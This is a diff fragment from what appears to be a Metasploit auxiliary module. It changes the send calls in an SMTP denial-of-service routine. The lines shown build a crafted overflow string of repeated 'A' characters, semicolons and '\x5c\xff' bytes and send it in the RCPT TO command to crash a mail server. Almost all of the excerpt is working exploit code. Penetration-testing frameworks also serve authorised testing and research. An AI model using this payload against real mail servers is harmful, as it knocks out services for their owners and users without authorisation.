@@ -38,10 +38,10 @@ class MetasploitModule < Msf::Auxiliary
 
       sploit = ("A" * 255 + ";") * 4 + "A" * 217 + ";" + "\x5c\xff" * 28
 
-      smtp_send_recv("EHLO X\r\n")
-      smtp_send_recv("MAIL FROM: #{datastore['MAILFROM']}\r\n")
+      raw_send_recv("EHLO X\r\n")
+      raw_send_recv("MAIL FROM: #{datastore['MAILFROM']}\r\n")
       print_status("Sending DoS packet.")
-      smtp_send_recv("RCPT TO: #{sploit}\r\n")
+      raw_send_recv("RCPT TO: #{sploit}\r\n")
 
       disconnect
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
